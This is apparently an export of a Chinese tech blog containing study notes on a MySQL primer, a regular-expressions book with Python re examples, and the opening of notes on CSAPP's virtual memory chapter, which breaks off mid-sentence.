id="第18章-全文本搜索"><a href="#第18章-全文本搜索" class="headerlink" title="第18章 全文本搜索"></a>第18章 全文本搜索</h5><p>MySQL支持几种基本的数据库引擎，但并非所有的引擎都支持全文本搜索。两个最常使用的引擎为MyISAM和InnoDB，前者支持全文本搜索，后者就不支持。<br>当我们想利用全文本搜索得到 包含MySQL内容的数据。<br>如下：</p><pre><code>select * from test_text where match(content) against(&#39;MySQL&#39;);</code></pre><p>上面语句中 match(content) 指示MySQL针对指定的列进行搜索，注意：传递给match()的值必须与fulltext()定义中的相同。against(‘MySQL’)指定词MySQL作为搜索文本。</p><h5 id="第19章-插入数据"><a href="#第19章-插入数据" class="headerlink" title="第19章 插入数据"></a>第19章 插入数据</h5><p>1、正因为没有字段名，则values中值得顺序必须与字段在表中顺序一致。<br>基本语法：</p><pre><code>INSERT INTO 表名 VALUES(值1，值2，....);</code></pre><p>2、为表的指定字段添加数据<br>基本语法：</p><pre><code>INSERT INTO 表名（字段1，字段2，...）     VALUES (值1，值2，...);</code></pre><h5 id="第20章-更新和删除数据"><a href="#第20章-更新和删除数据" class="headerlink" title="第20章 更新和删除数据"></a>第20章 更新和删除数据</h5><p><strong>UPDATE 语句</strong><br>基本语法：</p><pre><code>UPDATE 表名  SET  字段名1=值1[,字段名2=值2，...]  [WHERE 条件表达式]</code></pre><p><strong>删除数据</strong><br>即，对表中存在的记录进行删除。<br>基本语法：</p><pre><code>DELETE FROM 表名 [ WHERE 条件表达式 ]  ;</code></pre><p><strong>删除指定列</strong><br>基本语法：</p><pre><code>alter table tablename drop columnname;</code></pre><h5 id="第21章-创建和操纵表"><a href="#第21章-创建和操纵表" class="headerlink" title="第21章 创建和操纵表"></a>第21章 创建和操纵表</h5><p>为了利用CREATE TABLE创建表，必须给出下列信息：<br>1 新表的名字，在关键字CREATE TABLE之后给出<br>2 表列的名字和定义，用逗号分隔</p><pre><code>CREATE TABLE table(column_id  int       NOT NULL  AUTO_INCRMENT,columnOne  char(20)  NOT NULL  DEFAULT 1,columnOne  char(20)  NOT NULL ,column  char(20)  NOT NULL ,.....PRIMARY  KEY ( column_id)) ENGINE =  InnoDB</code></pre><p>如果表已经存在，则必须先删除后在创建他，不可以直接覆盖。如果仅想在表没有存在的情况下创建它，应该在表名后给出 IF NOT EXISTS<br>使用NULL值  如果不指定列为NOT NULL则它默认是NULL<br>主键再介绍  主键的值必须是唯一的。创建主键时可以用单列做主键PRIMARY KEY(columnOne,columnTwo)，也可以使用多列做主键PRIMARY KEY(columnOne,columnTwo).主键值不允许为NULL<br><strong>引擎搜索</strong><br>1 InnoDB是一个可靠的事务处理引擎，它不支持全文本搜索。<br>2 MEMORY 在功能上等同于MySAM，但由于数据存储在内存，所以速度更快（特别适用于临时表）<br>3 MySAM是一个性能极高的引擎，它支持全文本搜索，但不支持事务处理</p><h5 id="第22章-使用视图"><a href="#第22章-使用视图" class="headerlink" title="第22章 使用视图"></a>第22章 使用视图</h5><p>视图中不存放任何数据，在使用SQL语句访问视图的时候，返回的数据时MySQL从其他表中生成的。视图和表在同一个命名空间，在很多地方对于视图和表是同样对待的。不过也有不同，不能对视图创建触发器，不能使用DROP TABLE命令删除视图。<br>[1] 创建一个视图：</p><pre><code>create view Oceania asselect * from Country where Continent =&#39;Oceania&#39;with check option;</code></pre><p>[2] 删除视图</p><pre><code>drop view view_name;</code></pre><p>[3] 使用视图</p><pre><code>select * from view_name;</code></pre><h5 id="第23章-使用存储过程-类似于函数"><a href="#第23章-使用存储过程-类似于函数" class="headerlink" title="第23章 使用存储过程(类似于函数)"></a>第23章 使用存储过程(类似于函数)</h5><p>存储过程，是为了完成一个复杂任务，而编写的多条sql语句的集合，语句执行次序不定，需要根据检索条件判断。<br>存储过程实际上是一种函数，因此存储过程名后要加括号（），来放置参数，即使没有参数也要括号。<br><strong>创建存储过程</strong><br>返回产品的平均价格：</p><pre><code>delimiter //create procedure product_avgprice()  #括号来放置参数，即使没有参数也要括号。beginselect avg(prod_price) as avg_price  from products;end// ;</code></pre><p><strong>自定义分隔符：</strong><br>DELIMITER // 自定义定界符、分隔符，除了\，都可以作为分隔符。<br>自定义分隔符作用：替换系统分隔符-分号（;），防止系统报错。因为系统分不清（;）是存储过程结尾，还是sql语句结尾。<br><strong>执行存储过程</strong><br>例：查询产品平均价：call product_avgprice();  #括号来放置参数，即使没有参数也要括号。<br><strong>存储过程</strong><br>例：删除product_avgprice2存储过程：<br>drop procedure if exists product_avgprice2;  #注意这里过程名称后不带括号</p><h5 id="第24章-使用游标"><a href="#第24章-使用游标" class="headerlink" title="第24章 使用游标"></a>第24章 使用游标</h5><p>在检索出来的行中，前进或者后退一行或多行，就需要用到所谓的“游标”。游标不是某个SELECT语句，但是它是被该语句检索出来的结果集，另外，MySQL游标只能用于存储过程（和函数）。<br><strong>创建游标</strong><br>使用DECLARE和CURSOR关键字：</p><pre><code>CREATE PROCEDURE processorders()BEGIN  DECLARE ordernumbers CURSOR  FOR  SELECT order_num FROM orders;END;</code></pre><p><strong>打开和关闭游标</strong><br>因为游标局限于存储过程，所以如果存储过程处理完成后，游标就会消失。所以往往在存储过程中要关键字OPEN进行打开。另，游标相关的SELECT查询语句，在定义时是不执行的，在OPEN时才执行查询，存储检索出的数据以供浏览和滚动。在游标使用完成后，使用CLOSE进行关闭：</p><h5 id="第25章-触发器的使用"><a href="#第25章-触发器的使用" class="headerlink" title="第25章 触发器的使用"></a>第25章 触发器的使用</h5><p>触发器是MySQL响应DELETE,INSERT,UPDATE而自动执行的一条MySQL语句,其他语句不支持触发器。</p><p>　　创建触发器时，需要4个条件；<br>　　　　唯一的触发器名<br>　　　　触发器关联的表<br>　　　　触发器应该响应的活动<br>　　　　触发器何时执行</p><p>　　MySQL中触发器名在每个表中必须唯一，但是在同一个数据库中的两个表可具有相同名字的触发器。这个条件在其他的DBMS中是不允许的，所以为了统一，最好在同一个数据库中，触发器名设置成唯一的。</p><p><strong>创建触发器</strong></p><pre><code>CREATE TRIGGER newproduct AFTER INSERT ON productsFOR EACH ROW SELECT &#39;Product added&#39;;CREATE TRIGGER--创建一个叫newproduct的新触发器AFTER INSERT--此触发器将在INSERT语句成功后执行FOR EACH ROW--代码对每个插入行执行</code></pre><p><strong>删除触发器</strong></p><pre><code>DROP TRIGGER newproduct;</code></pre><p>使用触发器<br>　　INSERT触发器<br>　　　　可以引用一个叫NEW的虚拟表，来访问插入的行<br>　　DELETE触发器<br>　　　　引用一个叫OLD的虚拟表，来访问被删除的行<br>　　UPDATE触发器<br>　　　　书中缺页未介绍</p><h5 id="第26章-管理事务处理"><a href="#第26章-管理事务处理" class="headerlink" title="第26章 管理事务处理"></a>第26章 管理事务处理</h5><p>MySQL中有好几种引擎，但是不是每种引擎都支持事务处理<br>　　常用的引擎中InnoDB支持事务，MyISAM不支持事务<br>　　几个名词:<br>　　　　事务transaction<br>　　　　回退rollback<br>　　　　提交commit<br>　　　　保留点savepoint<br>控制事务管理</p><pre><code>ROLLBACKSELECT * FROM ordertotals;START TRANSACTION;DELETE FROM ordertotals;SELECT * FROM ordertotals;ROLLBACK;SELECT * FROM ordertotals;</code></pre><p>注意：事务用来管理INSERT、UPDATE和DELETE。不能回退CREATE或者DROP操作<br>更改默认的提交行为</p><pre><code>SET autocommit=0</code></pre><p>注意：autocommit标志是针对每个连接，而不是服务器；</p><h5 id="第27章-国际化与本地化"><a href="#第27章-国际化与本地化" class="headerlink" title="第27章 国际化与本地化"></a>第27章 国际化与本地化</h5><p>字符集和校对顺序<br>字符集：字母和符号的集合<br>编码：某个字符集成员的内部表示<br>校对：规定字符如何比较的指令<br>使用字符集和校对顺序<br>show character set; – 显示所有可用的字符集以及描述和默认校对<br>SHOW COLLATION; – 显示所有可用的校对以及它们适用的字符集</p><p>SHOW VARIABLES LIKE ‘character%’;<br>SHOW VARIABLES LIKE ‘collation%’; – 为了确定所用的字符集和校对</p><pre><code>CREATE TABLE mytable(    column1 INT,    column2 VARCHAR(10)) DEFAULT CHARACTER SET hebrew  COLLATE hebrew_general_ci;CREATE TABLE mytable(    columnn1 INT,    columnn2 VARCHAR(10),    column3  VARCHAR(10) CHARACTER SET latin1 COLLATE latin1_general_ci ) DEFAULT CHARACTER SET hebrew  COLLATE hebrew_general_ci;</code></pre><pre><code>SELECT * FROM customersORDER BY lastname, firstname COLLATE latin1_general_cs;</code></pre><h5 id="第28章-安全管理"><a href="#第28章-安全管理" class="headerlink" title="第28章 安全管理"></a>第28章 安全管理</h5><p>1.访问控制<br>管理访问控制需要创建和管理用户账号<br>有的用于管理，有的供用户使用，有的供开发人员使用；<br>建议不要使用root；<br>2.管理用户</p><pre><code>-- 获得用户列表SELECT user FROM user;-- 创建用户账号，ben是用户名，BY后面是口令；CREATE USER ben IDENTIFIED BY &#39;p@$$w0rd&#39;;-- 删除用户账号DROP USER bforta;-- 设置访问权限SHOW GRATNS FOR bforta; -- 显示权限GRANT SELECT ON crashcourse.* TO bforta;　--　添加SELECT权限REVOKE SELECT ON crashcourse.* FROM bforta; --　删除SELECT权限-- 设置口令(不指定用户，则默认更新当前用户口令)</code></pre><h5 id="第29章-数据库维护"><a href="#第29章-数据库维护" class="headerlink" title="第29章 数据库维护"></a>第29章 数据库维护</h5><p>1.备份数据<br>使用命令行实用程序mysqldump转储所有数据库内容到某个外部文件；<br>可用命令行实用程序mysqlhotcopy从一个数据库复制所有数据；<br>可以使用MySQL的BACKUP TABLE或SELECT INTO OUTFILE转储所有数据到某个外部文件；<br>2.进行数据库维护</p><pre><code>-- 用来检查表键是否正确；ANALYZE TABLE orders;-- 用来针对许多问题对表进行检查；CHECK TABLE orders,orderitems;</code></pre><p>3.查看日志文件<br>错误日志；<br>查询日志；<br>二进制日志；<br>缓慢查询日志；</p><h5 id="第30章-改善性能"><a href="#第30章-改善性能" class="headerlink" title="第30章 改善性能"></a>第30章 改善性能</h5><p>一大堆优化性能的建议</p><h3 id="四、操作符优先级"><a href="#四、操作符优先级" class="headerlink" title="四、操作符优先级"></a>四、操作符优先级</h3><pre><code>优先级 运算符(最高)  !    -（负号）,~（按位取反）    ^（按位异或）    *,/(DIV),%(MOD)    +,-    &gt;&gt;,&lt;&lt;    &amp;    |    =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP   BETWEEN AND,CASE,WHEN,THEN,ELSE   NOT   &amp;&amp;,AND   XOR   ||,OR(最低)    =(赋值运算),:=</code></pre><h3 id="你是妖怪吧！！！有耐心看到这Orz-熟能生巧，天道酬勤，一起加油"><a href="#你是妖怪吧！！！有耐心看到这Orz-熟能生巧，天道酬勤，一起加油" class="headerlink" title="你是妖怪吧！！！有耐心看到这Orz 熟能生巧，天道酬勤，一起加油"></a>你是妖怪吧！！！有耐心看到这Orz 熟能生巧，天道酬勤，一起加油</h3>]]></content>
      
      
      <categories>
          
          <category> Mysql必知必会 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式必知必会&amp;&amp;python-re模块简单使用</title>
      <link href="/2019/01/15/zheng-ze-biao-da-shi-bi-zhi-bi-hui/"/>
      <url>/2019/01/15/zheng-ze-biao-da-shi-bi-zhi-bi-hui/</url>
      
        <content type="html"><![CDATA[<h4 id="正则表达式还是要会的，不然你连受处分得资格都没有（无意调侃，莫怪罪。虽然说这样的工具类的东西，知道1，其他的要什么再去查博客啦，文档啦什么的就行，但是如果你觉得有必要，系统性的过一遍，收获还是蛮大的，突然又回想起暑假PM工作那问会不会Linux-shell编程，其实之前是看过的，但是没有系统的去学，突然要你写起来就非常僵硬，还是咕咕咕了"><a href="#正则表达式还是要会的，不然你连受处分得资格都没有（无意调侃，莫怪罪。虽然说这样的工具类的东西，知道1，其他的要什么再去查博客啦，文档啦什么的就行，但是如果你觉得有必要，系统性的过一遍，收获还是蛮大的，突然又回想起暑假PM工作那问会不会Linux-shell编程，其实之前是看过的，但是没有系统的去学，突然要你写起来就非常僵硬，还是咕咕咕了" class="headerlink" title="正则表达式还是要会的，不然你连受处分得资格都没有（无意调侃，莫怪罪。虽然说这样的工具类的东西，知道1，其他的要什么再去查博客啦，文档啦什么的就行，但是如果你觉得有必要，系统性的过一遍，收获还是蛮大的，突然又回想起暑假PM工作那问会不会Linux shell编程，其实之前是看过的，但是没有系统的去学，突然要你写起来就非常僵硬，还是咕咕咕了"></a>正则表达式还是要会的，不然你连受处分得资格都没有（无意调侃，莫怪罪。虽然说这样的工具类的东西，知道1，其他的要什么再去查博客啦，文档啦什么的就行，但是如果你觉得有必要，系统性的过一遍，收获还是蛮大的，突然又回想起暑假PM工作那问会不会Linux shell编程，其实之前是看过的，但是没有系统的去学，突然要你写起来就非常僵硬，还是咕咕咕了</h4><h3 id="本书主要内容"><a href="#本书主要内容" class="headerlink" title="本书主要内容"></a>本书主要内容</h3><p><img src="1.png" alt=""></p><a id="more"></a><p>前人栽树后人乘凉，前人画图后人观赏<br>（意思就是图是盗来的（读书人怎么能叫盗呢，ε=ε=ε=┏(゜ロ゜;)┛逃。</p><h4 id="第一章、入门"><a href="#第一章、入门" class="headerlink" title="第一章、入门"></a>第一章、入门</h4><p>正则表达式（regular expression，简称 regex）是文本处理方面最强大的工具之一。正则表达式语言用来构造正则表达式（最终构造出来的字符串就称为正则表达式），正则表达式用来完成搜索或替换操作。实际的正则表达式经常被简称为模式，它们其实是一些由字符构成的字符串。这些字符可以是普通字符（纯文本）或元字符（有特殊含义的特殊字符）。<br>推荐一个工具Regester，本地测试的小工具<br><a href="http://deerchao.net/tools/regester/index.htm" target="_blank" rel="noopener">Regester传送门</a></p><h4 id="第二章、匹配单个字符"><a href="#第二章、匹配单个字符" class="headerlink" title="第二章、匹配单个字符"></a>第二章、匹配单个字符</h4><p>1.匹配纯文本：  </p><p>文本：Hello , my name is Ben. Please visit my website at <a href="http://www.forta.com/" target="_blank" rel="noopener">http://www.forta.com/</a> .</p><p>正则表达式：Ben</p><p>结果：Hello , my name is Ben. Please visit my website at <a href="http://www.forta.com/" target="_blank" rel="noopener">http://www.forta.com/</a> .</p><p>2.匹配任意字符：</p><p>“.”元字符可以匹配任何一个单个的字符。</p><p>3.匹配特殊字符：</p><p>“\”元字符可以对有含义的字符进行转义。</p><p>小结：正则表达式经常被简称为模式，它们其实是一些由字符构成的字符串。这些字符可以是普通字符（纯文本）或元字符（特殊含义的字符）。“.”可以匹配任何字符。“\”用来对字符进行转义。</p><h4 id="第三章、匹配一组字符"><a href="#第三章、匹配一组字符" class="headerlink" title="第三章、匹配一组字符"></a>第三章、匹配一组字符</h4><p>1.匹配多个字符中的某一个：</p><p>“[”和“]”元字符定义一个字符集合。</p><p>在使用“[”和“]”定义的字符集合里，这两个字符之间的所有字符都是该集合的组成部分，字符集合的匹配结果是能够与该集合里的任意一个成员相匹配的文本。</p><p>2.利用字符集合区间：</p><p>正则表达式提供了一个特殊的元字符，字符区间可以用“-”（连字符）来定义。</p><p>字符区间：[A-Z]、[a-z]、[A-z]、[A-Za-z0-9]</p><p>Ps：区间外为“-”本身，无需转义</p><p>3.取非匹配：</p><p>“^”元字符表明对一个字符集合进行取非匹配。</p><p>取非：[^0-9]：匹配任何不是数字的字符</p><p>小结：元字符“[”和“]”用来定义一个字符集合，其含义是必须匹配该集合里的字符之一。定义一个字符集合的具体做法有两种：一是把所有的字符都列举出来；二是利用元字符“-”以字符区间的方式给出。字符集合可以以元字符“^”来求非，这将把给定的字符集强行排除在匹配操作以外，除了该字符集合里的字符，其他字符都可匹配。</p><h4 id="第四章、使用元字符"><a href="#第四章、使用元字符" class="headerlink" title="第四章、使用元字符"></a>第四章、使用元字符</h4><p>1.元字符：是在正则表达式里有特殊含义的字符。</p><p>元字符分类：  ①匹配文字（例如“.”）</p><p> ②正则表达式语法要求（例如“[”“]”）<br> <img src="2.png" alt=""><br> <img src="3.png" alt=""><br> <img src="4.png" alt=""><br> <img src="5.png" alt=""></p><h4 id="第五章、重复匹配"><a href="#第五章、重复匹配" class="headerlink" title="第五章、重复匹配"></a>第五章、重复匹配</h4><p> 1.匹配一个或多个字符：</p><p>“+”：匹配一个或多个字符或字符集合，不可匹配0个字符。</p><p>Ps：一般来说，当在字符集合里使用“.”“+”这样的元字符时，被看做普通字符，无需转义。</p><p>2.匹配零个或多个字符：</p><p>“*”：匹配字符连续出现零次或多次的情况。</p><p>3.匹配零个或一个字符：</p><p>“？”：只能匹配一个字符或字符集合的零次或一次重复。</p><p>4.匹配的重复次数：</p><p>“{”“}”：在其中给出重复次数。</p><p>{数字}：确切的数</p><p>{小值，大值}：区间</p><p>{小值， }：至少重复“小值”次。<br> <img src="6.png" alt=""></p><h4 id="第六章、位置匹配"><a href="#第六章、位置匹配" class="headerlink" title="第六章、位置匹配"></a>第六章、位置匹配</h4><p> 1.边界限定符：<br>  <img src="7.png" alt=""><br>  ③分行匹配模式：“（?m）”为分行匹配模式，把行分隔符当一个字符串分隔符。</p><h4 id="第七章、使用子表达式"><a href="#第七章、使用子表达式" class="headerlink" title="第七章、使用子表达式"></a>第七章、使用子表达式</h4><p>1.子表达式必须用“（”和“）”括起来。</p><p>2.子表达式的嵌套：</p><p>文本：Pinging hog.forta.com [12.159.46.200] with 32 bytes of data:</p><p>正则表达式：(((\d{1,2})|(1\d{2})|(2[0-4]\d)|(25[0-5])).){3}((\d{1,2})|(1\d{2})|(2[0-4]\d)|(25[0-5]))</p><p>结果：Pinging hog.forta.com [<strong>12.159.46.200</strong>] with 32 bytes of data:</p><p>小结：子表达式的作用是把同一个表达式的各个相关部分组合在一起。用“(”“)”来定义。子表达式的常见用途包括：对重复次数元字符的作用对象作出精确的设定和控制、对“|”操作符的OR条件作出准确的定义。</p><h4 id="第八章、回溯引用，前后一致匹配"><a href="#第八章、回溯引用，前后一致匹配" class="headerlink" title="第八章、回溯引用，前后一致匹配"></a>第八章、回溯引用，前后一致匹配</h4><p>1.子表达式的另一用途：定义回溯引用。</p><p>2.“\1”是一个回溯引用，回溯引用指的是模式的后半部分引用在前半部分中定义的子表达式。</p><p>Ps：“\0”用来表示整个正则表达式。</p><p>文本：This is a block of of text,several words here are are repeated ,and and they should not be.</p><p>正则表达式：[ ]+(\w+)[ ]+\1</p><p>结果：This is a block of of text,several words here are are repeated ,and and they should not be.</p><p>3.回溯引用在替换操作中的应用：</p><p>替换操作需要用到两个正则表达式：搜索模式和替换模式。</p><p>文本：Hello , <a href="mailto:ben@forta.com" target="_blank" rel="noopener">ben@forta.com</a> is my email address.</p><p>正则表达式： (\w+[\w.]*@[\w.]+.\w+)</p><p>替换：<A HREF = “mailto:$1”>$1</A></p><p>结果：Hello , <A HREF = “mailto:ben@forta.com”> ben@forta.com</A> is my email address.<br><img src="8.png" alt=""></p><h4 id="第九章、前后查找"><a href="#第九章、前后查找" class="headerlink" title="第九章、前后查找"></a>第九章、前后查找</h4><p>1.向前查找：指定了一个必须匹配但不在结果中返回的模式。</p><p>从语法上来看，一个向前查找模式其实就是一个以“?=”开头的子表达式，需要匹配的文本跟在“=”的后面。</p><p>“匹配和返回文本”：消费</p><p>“只匹配不返回”：不消费</p><p>向前查找（向后查找）匹配本身其实是有返回结果的，只是这个结果的字节长度永远为0而已。因此，前后查找操作有时也称为零宽度匹配操作。</p><p>文本：</p><pre><code>    http://www.forta.com/    https://mail.forta.com/    ftp://ftp.forta.com/</code></pre><p>正则表达式： .+(?=:)</p><p>结果：<br><strong>http</strong></p><p><strong>https</strong></p><p>2.向后查找：“?&lt;=”元字符。</p><p>文本：</p><pre><code>    ABC01：$23.45    HGG42：$5.31    CFMX1：$899.00    XTC99：$69.96    Total items found: 4</code></pre><p>正则表达式：(?&lt;=$)[0-9.]+</p><p>结果：<br>ABC01：$<strong>23.45</strong></p><p>HGG42：$<strong>5.31</strong></p><p>CFMX1：$<strong>899.00</strong></p><p>XTC99：$<strong>69.96</strong></p><p>Total items found: 4<br><img src="9.png" alt=""></p><p>$30 for 100 apples, 50 oranges, and 60 pears. I saved $5 on this order . </p><p>正则表达式：\b(?&lt;!$)\d+\b</p><p>结果：I paid $30 for <strong>100</strong> apples, <strong>50</strong> oranges, and <strong>60</strong> pears. I saved $5 on this order . （匹配数量）</p><p>小结：有了向后查找，可以对最终的匹配结果包含且只包含哪些内容作出更精确的控制。前后查找操作可以利用子表达式来指定文本匹配操作的发生位置，并收到只匹配不消费的效果。</p><h4 id="第十章、-嵌入条件"><a href="#第十章、-嵌入条件" class="headerlink" title="第十章、 嵌入条件"></a>第十章、 嵌入条件</h4><p>1.正则表达式里的条件用“?”来定义。</p><p>2.嵌入条件：①根据一个回溯引用来进行条件处理。</p><p> ②根据一个前后查找来进行条件处理。</p><p>3.回溯引用条件：</p><p>?(1)：检查第一个回溯引用是否存在。</p><p>文本：</p><pre><code>     123-456-7890     (123)456-7890     (123)-456-7890     (123-456-7890     1234567890     123 456 7890</code></pre><p>正则表达式：(\()?\d{3}(?(1))|-)\d{3}-\d{4}</p><p>结果：<br><strong>123-456-7890</strong></p><p><strong>(123)456-7890</strong></p><p>(123)-456-7890</p><p>(123-456-7890</p><p>1234567890</p><p>123 456 7890</p><p>4.前后查找条件:  (?(前后查找表达式))</p><p>文本：</p><pre><code>    11111    22222    33333-    44444-4444</code></pre><p>正则表达式：\d{5}(?(?=-)-\d{4})</p><p>结果：<br><strong>11111</strong></p><p><strong>22222</strong></p><p>33333-</p><p><strong>44444-4444</strong></p><h3 id="简单的python正则表达式-re模块"><a href="#简单的python正则表达式-re模块" class="headerlink" title="简单的python正则表达式(re模块)"></a>简单的python正则表达式(re模块)</h3><p>1、一个网页的HTML源码。其中有一段</p><pre><code>&lt;html&gt;&lt;body&gt;&lt;h1&gt;hello world&lt;h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>你想要把这个hello world提取出来</p><pre><code>import rekey = r&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;hello world&lt;h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;#这段是你要匹配的文本p1 = r&quot;(?&lt;=&lt;h1&gt;).+?(?=&lt;h1&gt;)&quot;#这是我们写的正则表达式规则，你现在可以不理解啥意思pattern1 = re.compile(p1)#我们在编译这段正则表达式matcher1 = re.search(pattern1,key)#在源文本中搜索符合正则表达式的部分print matcher1.group(0)#打印出来</code></pre><p>2、既有http://开头的，又有https://开头的，我们怎么处理？</p><pre><code>import rekey = r&quot;http://www.nsfbuhwe.com and https://www.auhfisna.com&quot;#胡编乱造的网址，别在意p1 = r&quot;https*://&quot;#看那个星号！1pattern1 = re.compile(p1)print pattern1.findall(key)</code></pre><p>输出</p><pre><code>[&#39;http://&#39;, &#39;https://&#39;]</code></pre><p>findall函数返回的总是正则表达式在字符串中所有匹配结果的列表</p>]]></content>
      
      
      <categories>
          
          <category> 正则表达式必知必会 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之虚拟内存</title>
      <link href="/2019/01/13/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-xu-ni-nei-cun/"/>
      <url>/2019/01/13/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-xu-ni-nei-cun/</url>
      
        <content type="html"><![CDATA[<h4 id="本章还是比较肝的，说起虚拟内存想起了另外一个书《C-primer-plus》，大一寒假玩了一个月，唯独花了点时间看了这本书，印象最深的还是这本书讲了内存模型和名称空间，后悔啊大一上没看csapp，所以看的一脸懵逼，还没看懂，csapp这一章确实很精髓，曹神也和我聊过（Orz-曹神牛逼），看了csapp感觉其他所有的书都是在这个基础上的拓展，这样吸收其他书的知识就没有很高的门槛，对于内存这一块，印象比较深刻的还是《程序员的自我修养》，专门讲链接装载与库的一本书，没看csapp之前看那本书真的是一脸懵逼，看完csapp再看那本书还是收获非常大的。"><a href="#本章还是比较肝的，说起虚拟内存想起了另外一个书《C-primer-plus》，大一寒假玩了一个月，唯独花了点时间看了这本书，印象最深的还是这本书讲了内存模型和名称空间，后悔啊大一上没看csapp，所以看的一脸懵逼，还没看懂，csapp这一章确实很精髓，曹神也和我聊过（Orz-曹神牛逼），看了csapp感觉其他所有的书都是在这个基础上的拓展，这样吸收其他书的知识就没有很高的门槛，对于内存这一块，印象比较深刻的还是《程序员的自我修养》，专门讲链接装载与库的一本书，没看csapp之前看那本书真的是一脸懵逼，看完csapp再看那本书还是收获非常大的。" class="headerlink" title="本章还是比较肝的，说起虚拟内存想起了另外一个书《C++ primer plus》，大一寒假玩了一个月，唯独花了点时间看了这本书，印象最深的还是这本书讲了内存模型和名称空间，后悔啊大一上没看csapp，所以看的一脸懵逼，还没看懂，csapp这一章确实很精髓，曹神也和我聊过（Orz,曹神牛逼），看了csapp感觉其他所有的书都是在这个基础上的拓展，这样吸收其他书的知识就没有很高的门槛，对于内存这一块，印象比较深刻的还是《程序员的自我修养》，专门讲链接装载与库的一本书，没看csapp之前看那本书真的是一脸懵逼，看完csapp再看那本书还是收获非常大的。"></a>本章还是比较肝的，说起虚拟内存想起了另外一个书《C++ primer plus》，大一寒假玩了一个月，唯独花了点时间看了这本书，印象最深的还是这本书讲了内存模型和名称空间，后悔啊大一上没看csapp，所以看的一脸懵逼，还没看懂，csapp这一章确实很精髓，曹神也和我聊过（Orz,曹神牛逼），看了csapp感觉其他所有的书都是在这个基础上的拓展，这样吸收其他书的知识就没有很高的门槛，对于内存这一块，印象比较深刻的还是《程序员的自我修养》，专门讲链接装载与库的一本书，没看csapp之前看那本书真的是一脸懵逼，看完csapp再看那本书还是收获非常大的。</h4><p><img src="1.webp" alt=""></p><a id="more"></a><p>虚拟存储器又叫做虚拟内存，我们现在的操作系统普遍都支持了虚拟内存，这样做是因为我们同时运行着太多的程序了，如果不使用虚拟内存4G的内存空间很快就会被耗尽，而一旦没有了内存空间，其他程序就无法加载了。虚拟内存的出现就是为了解决这个问题，当一个程序开始运行的时候，其实是为每个程序单独创建了一个页表（这个以后讲），只将一部分放入内存中，以后根据实际的需要随时从硬盘中调入内容。当然虚拟内存不仅仅只有这个功能，我们的操作系统也是在内存中运行着的，虚拟内存同时还提供了一种保护，这样做其他进程就不会损坏掉系统的内存空间。</p><h3 id="1、物理寻址和虚拟寻址"><a href="#1、物理寻址和虚拟寻址" class="headerlink" title="1、物理寻址和虚拟寻址"></a>1、物理寻址和虚拟寻址</h3><h4 id="1-1、物理地址-Physical-Address-PA-计算机系统的主存被组织为M个连续的字节大小的单元组成的数组。每个字节的地址叫物理地址-CPU访问存储器的最自然的方式使用物理地址，这种方式称为物理寻址。-早期的PC，数字信号处理器，嵌入式微控制器以及Cray超级计算机使用物理寻址"><a href="#1-1、物理地址-Physical-Address-PA-计算机系统的主存被组织为M个连续的字节大小的单元组成的数组。每个字节的地址叫物理地址-CPU访问存储器的最自然的方式使用物理地址，这种方式称为物理寻址。-早期的PC，数字信号处理器，嵌入式微控制器以及Cray超级计算机使用物理寻址" class="headerlink" title="1.1、物理地址(Physical Address,PA):计算机系统的主存被组织为M个连续的字节大小的单元组成的数组。每个字节的地址叫物理地址.CPU访问存储器的最自然的方式使用物理地址，这种方式称为物理寻址。 早期的PC，数字信号处理器，嵌入式微控制器以及Cray超级计算机使用物理寻址"></a>1.1、物理地址(Physical Address,PA):计算机系统的主存被组织为M个连续的字节大小的单元组成的数组。每个字节的地址叫物理地址.CPU访问存储器的最自然的方式使用物理地址，这种方式称为物理寻址。 早期的PC，数字信号处理器，嵌入式微控制器以及Cray超级计算机使用物理寻址</h4><p><img src="2.webp" alt=""><br>主存的每个地址都是唯一的，第一个字节地址为0，接下来为2，以此类推。CPU使用这种访问方式就是物理寻址。上图所示就是CPU通过地址总线传递读取主存中4号地址开始处的内容并通过数据总线传送到CPU的寄存器中。</p><h4 id="1-2、现代处理器使用的是虚拟寻址-virtual-addressing-的寻址形式。"><a href="#1-2、现代处理器使用的是虚拟寻址-virtual-addressing-的寻址形式。" class="headerlink" title="1.2、现代处理器使用的是虚拟寻址(virtual addressing)的寻址形式。"></a>1.2、现代处理器使用的是虚拟寻址(virtual addressing)的寻址形式。</h4><p>CPU芯片上有叫做存储器管理单元(Memory Management Unit,MMU)的专用硬件<br>使用虚拟寻址的时候，cpu先是生成一个虚拟地址：4100再经过地址翻译器，将4100翻译成物理地址。<br><img src="3.webp" alt=""><br>我们知道对内存的访问要比硬盘的访问快10000倍，如果我们在内存中没有找到相应的内容（不命中），而需要到硬盘上找的话，我们必须要提供相对来说高效率的访问方式。这时候就创建了一个虚拟存储器，管理着磁盘，以每页的方式进行整合，每个页面的大小4kb-2mb不等，加上偏移量就成为了一个虚拟地址。比如4100，说明的就是页4编号，偏移100处的位置。这就比挨个挨个单独寻址要快的多。</p><h3 id="2、地址空间"><a href="#2、地址空间" class="headerlink" title="2、地址空间"></a>2、地址空间</h3><p><code>地址空间(address space)</code>是一个非负整数<code>地址</code>的有序集合。</p><ul><li><p>如果地址空间中整数是连续的，我们说它是<code>线性地址空间(linear address space)</code>。</p><ul><li>为了简化讨论，我们总是假设使用线性地址空间。</li></ul></li><li><p>在一个带虚拟存储器的系统中，CPU从一个有<code>N=2^n</code>个地址的<code>地址空间</code>中生成虚拟地址，这个地址空间称为<code>虚拟地址空间(virtual address 